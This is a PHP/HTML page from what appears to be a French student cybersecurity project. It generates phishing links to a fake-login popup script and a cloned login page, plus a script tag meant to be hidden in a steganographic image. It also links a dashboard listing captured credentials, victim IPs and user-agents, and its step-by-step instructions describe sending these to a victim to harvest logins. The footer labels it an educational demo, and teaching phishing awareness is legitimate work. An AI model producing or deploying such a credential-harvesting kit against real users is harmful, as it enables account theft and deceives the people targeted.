<?php
// Helper - Générateur de lien phishing
// Page pour générer facilement des liens phishing pour la démonstration

session_start();
include '../traitements/db.php';

// Vérifier que l'utilisateur est connecté
if (!isset($_SESSION["user_id"])) {
    header("Location: ../login.php");
    exit();
}

$user_id = $_SESSION["user_id"];
$username = $_SESSION["username"] ?? "Utilisateur";

// Obtenir l'URL de base du serveur
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'];
$baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";

// URL du script popup
$popupUrl = $baseUrl . "/codes/assets/popup.js?sender=" . urlencode($user_id);

// URL de la page fake login
$fakeLoginUrl = $baseUrl . "/codes/fake_login/index.php?sender=" . urlencode($user_id);

// URL du dashboard
$dashboardUrl = $baseUrl . "/codes/fake_login/dashboard.php";

?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Générateur de Lien Phishing - Démo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        
        .header {
            background: white;
            padding: 25px;
            border-radius: 10px 10px 0 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            border-bottom: 3px solid #667eea;
        }
        
        .header h1 {
            color: #333;
            margin-bottom: 5px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        .content {
            background: white;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        
        .section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 1px solid #eee;
        }
        
        .section:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .section h2 {
            color: #667eea;
            font-size: 18px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .url-box {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            word-break: break-all;
            border-left: 4px solid #667eea;
        }
        
        .copy-btn {
            background: #667eea;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
            margin-top: 10px;
        }
        
        .copy-btn:hover {
            background: #764ba2;
        }
        
        .copy-btn.copied {
            background: #27ae60;
        }
        
        .button-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 15px;
        }
        
        .btn {
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 13px;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        
        .btn-primary {
            background: #667eea;
            color: white;
        }
        
        .btn-primary:hover {
            background: #764ba2;
        }
        
        .btn-success {
            background: #27ae60;
            color: white;
        }
        
        .btn-success:hover {
            background: #229954;
        }
        
        .info-box {
            background: #e8f4f8;
            border: 1px solid #b3dfe8;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 15px;
            color: #2c5aa0;
            font-size: 13px;
            line-height: 1.5;
        }
        
        .footer {
            background: #f9f9f9;
            padding: 20px 30px;
            border-top: 1px solid #eee;
            border-radius: 0 0 10px 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            color: #666;
            font-size: 13px;
        }
        
        .qr-section {
            text-align: center;
        }
        
        .qr-code {
            background: white;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            display: inline-block;
        }
        
        code {
            background: #f0f0f0;
            padding: 3px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Générateur de Lien Phishing</h1>
            <p>Démonstration éducative - Créer et tester des attaques de phishing</p>
        </div>
        
        <div class="content">
            <!-- Section 1: Script popup -->
            <div class="section">
                <h2>📌 Méthode 1: Pop-up de Fausse Connexion</h2>
                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
                    Envoyez ce lien ou mettez le script dans une image stéganographiée. 
                    Un pop-up de fausse connexion s'affichera immédiatement.
                </p>
                
                <div class="url-box"><?php echo htmlspecialchars($popupUrl); ?></div>
                
                <div class="button-group">
                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($popupUrl); ?>', this)">
                        📋 Copier le lien
                    </button>
                </div>
                
                <div class="info-box">
                    <strong>💡 Utilisation:</strong><br>
                    1. Copiez ce lien<br>
                    2. Envoyez-le via message ou email<br>
                    3. Quand la victime clique, le pop-up s'affiche<br>
                    4. Ses identifiants seront capturés
                </div>
            </div>
            
            <!-- Section 2: Page fake login -->
            <div class="section">
                <h2>🔐 Méthode 2: Page Fausse de Connexion</h2>
                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
                    Lien vers une page complète qui imite la vraie page de connexion.
                </p>
                
                <div class="url-box"><?php echo htmlspecialchars($fakeLoginUrl); ?></div>
                
                <div class="button-group">
                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($fakeLoginUrl); ?>', this)">
                        📋 Copier le lien
                    </button>
                    <a href="<?php echo htmlspecialchars($fakeLoginUrl); ?>" class="btn btn-primary" target="_blank">
                        👁️ Prévisualiser
                    </a>
                </div>
                
                <div class="info-box">
                    <strong>💡 Utilisation:</strong><br>
                    1. Partagez ce lien avec la victime<br>
                    2. La victime pense revenir à la page de connexion<br>
                    3. Elle rentre ses identifiants<br>
                    4. Vous les recevez automatiquement
                </div>
            </div>
            
            <!-- Section 3: Script pour stéganographie -->
            <div class="section">
                <h2>🖼️ Méthode 3: Script pour Stéganographie</h2>
                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
                    Code HTML/JavaScript à placer dans une image stéganographiée.
                </p>
                
                <div class="url-box" style="white-space: pre-wrap;">
&lt;script src="<?php echo htmlspecialchars($popupUrl); ?>"&gt;&lt;/script&gt;</div>
                
                <div class="button-group">
                    <button class="copy-btn" onclick="copyToClipboard('<script src=\"<?php echo htmlspecialchars($popupUrl); ?>\"><\/script>', this)">
                        📋 Copier le code
                    </button>
                </div>
                
                <div class="info-box">
                    <strong>💡 Utilisation:</strong><br>
                    1. Utilisez un outil de stéganographie (SilentEye, Steghide)<br>
                    2. Cachez le code JavaScript dans une image<br>
                    3. Envoyez l'image à la victime<br>
                    4. Quand elle visualise l'image, le script s'exécute<br>
                    5. Le pop-up s'affiche et capture ses identifiants
                </div>
            </div>
            
            <!-- Section 4: Dashboard -->
            <div class="section">
                <h2>📊 Mon Dashboard de Capture</h2>
                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
                    Accédez à votre dashboard pour voir tous les identifiants capturés.
                </p>
                
                <div class="url-box"><?php echo htmlspecialchars($dashboardUrl); ?></div>
                
                <div class="button-group">
                    <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($dashboardUrl); ?>', this)">
                        📋 Copier le lien
                    </button>
                    <a href="<?php echo htmlspecialchars($dashboardUrl); ?>" class="btn btn-success">
                        📊 Ouvrir le Dashboard
                    </a>
                </div>
                
                <div class="info-box">
                    <strong>✓ Sur votre dashboard, vous verrez:</strong><br>
                    ✓ Tous les identifiants capturés<br>
                    ✓ Date et heure de chaque capture<br>
                    ✓ Adresse IP de la victime<br>
                    ✓ User-Agent du navigateur
                </div>
            </div>
            
            <!-- Section 5: Test -->
            <div class="section">
                <h2>🧪 Tester la Démo</h2>
                <p style="color: #666; margin-bottom: 15px; font-size: 14px;">
                    Procédure rapide pour tester le phishing.
                </p>
                
                <div style="background: #f9f9f9; padding: 15px; border-radius: 5px; border-left: 4px solid #e74c3c;">
                    <ol style="color: #333; font-size: 14px; line-height: 1.8;">
                        <li><strong>Déconnectez-vous</strong> (ou ouvrez une fenêtre privée)</li>
                        <li><strong>Cliquez sur le lien de phishing</strong> ci-dessus (Méthode 1 ou 2)</li>
                        <li><strong>Entrez des identifiants de test</strong> (ex: test/test123)</li>
                        <li><strong>Retournez au dashboard</strong> et vérifiez la capture</li>
                    </ol>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>
                🔐 Démonstration éducative uniquement | À usage académique | Respect des lois locales<br>
                Créé pour: Projet de Cybersécurité | Année: 2026
            </p>
        </div>
    </div>
    
    <script>
        function copyToClipboard(text, button) {
            navigator.clipboard.writeText(text).then(() => {
                button.textContent = '✓ Copié!';
                button.classList.add('copied');
                setTimeout(() => {
                    button.textContent = '📋 Copier le lien';
                    button.classList.remove('copied');
                }, 2000);
            });
        }
    </script>
</body>
</html>
